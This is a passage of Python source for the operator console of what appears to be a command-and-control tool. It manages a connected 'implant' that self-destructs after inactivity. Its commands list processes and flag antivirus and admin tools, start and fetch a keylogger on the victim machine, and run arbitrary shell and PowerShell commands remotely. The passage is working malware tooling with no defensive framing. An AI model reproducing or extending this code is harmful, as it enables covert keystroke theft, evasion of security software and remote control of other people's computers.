                        print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will self-destruct after: " + str(selfdestuct) + " hours of no activity")
                        print(Fore.BLUE + "[!]" + Fore.RESET + " UUID For Implant: " + trackingString)
                        print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL)

                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

                elif cmd.lower() == "ps":
                    if connected:
                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Attempting to grab a list of running processes...\n")
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Suspected AV processes will be highlighted in " + Fore.RED + "RED" + Fore.RESET)
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Explorer and Winlogon processes will be highlighted in " + Fore.BLUE + "BLUE" + Fore.RESET)
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Browser processes will be highlighted in " + Fore.GREEN + "GREEN" + Fore.RESET)
                        print(
                            Fore.BLUE + "[!]" + Fore.RESET + " Admin tool processes will be highlighted in " + Fore.YELLOW + "YELLOW\n" + Fore.RESET)
                        taskCommand("tasklist /V")
                        global ps
                        ps = True
                        lastdictsize = getResults(lastdictsize)
                        ps = False

                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


                elif cmd.lower().startswith("keystrokes"):
                    if connected:
                        keychoice = cmd.replace("keystrokes ", "")
                        if keychoice.lower() != "start" and keychoice.lower() != "stop" and keychoice.lower() != "fetch":
                            print(
                                Fore.RED + "[-]" + Fore.RESET + " Invalid option. Valid entry is: keystrokes `start` `stop` or `fetch`\n")
                            continue
                        else:
                            keystrokes(keychoice)
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
                        continue


                elif cmd.lower().startswith("powershell "):
                    if connected:
                        taskCommand("powershell.exe -c " + cmd.split("powershell ")[1])
                        lastdictsize = getResults(lastdictsize)

                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")


                elif cmd.lower().startswith("shell "):
                    if connected:
                        cmd = cmd.replace("shell ", "", 1)
                        taskCommand(cmd)
                        lastdictsize = getResults(lastdictsize)
                    else:
                        print(
                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")

                elif cmd == "":
                    continue

                # If none of the above is true
                else:
                    print(Fore.RED + "[-]" + Fore.RESET + " Invalid command. Type `help` for a list of commands\n")

            except KeyboardInterrupt:
                print()
                serverExit()
                pass

    except Exception as e:
        print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print(exc_type, fname, exc_tb.tb_lineno)
        pass


# Animations ############################################################################################################
def chunkAnimate():
    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Rebuilding Output   ',
                              Fore.BLUE + '[/]' + Fore.RESET + ' Rebuilding Output.  ',
                              Fore.BLUE + '[-]' + Fore.RESET + ' Rebuilding Output.. ',
                              Fore.BLUE + '[\\]' + Fore.RESET + ' Rebuilding Output...']):
        if doneChunked:
            break
        sys.stdout.write('\r' + c)
        sys.stdout.flush()
        time.sleep(0.25)


def animateWaitForImplant():
    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Waiting for implant connection   ',
                              Fore.BLUE + '[/]' + Fore.RESET + ' Waiting for implant connection.  ',
                              Fore.BLUE + '[-]' + Fore.RESET + ' Waiting for implant connection.. ',
                              Fore.BLUE + '[\\]' + Fore.RESET + ' Waiting for implant connection...']):
        if doneWaitForImplant:
            break
        sys.stdout.write('\r' + c)
        sys.stdout.flush()
        time.sleep(0.25)


def animateFetchKeylog():
    for c in itertools.cycle([Fore.BLUE + '[|]' + Fore.RESET + ' Requesting Keystrokes   ',
                              Fore.BLUE + '[/]' + Fore.RESET + ' Requesting Keystrokes.  ',
                              Fore.BLUE + '[-]' + Fore.RESET + ' Requesting Keystrokes.. ',
                              Fore.BLUE + '[\\]' + Fore.RESET + ' Requesting Keystrokes...']):
        if waitForKeys:
            break
        sys.stdout.write('\r' + c)
        sys.stdout.flush()
        time.sleep(0.25)


def animate():
    for c in itertools.cycle(
            [Fore.BLUE + '[|]' + Fore.RESET + ' loading   ', Fore.BLUE + '[/]' + Fore.RESET + ' loading.  ',
             Fore.BLUE + '[-]' + Fore.RESET + ' loading.. ', Fore.BLUE + '[\\]' + Fore.RESET + ' loading...']):
        if done:
            break
        sys.stdout.write('\r' + c)
        sys.stdout.flush()
        time.sleep(0.25)


if __name__ == '__main__':
    main()


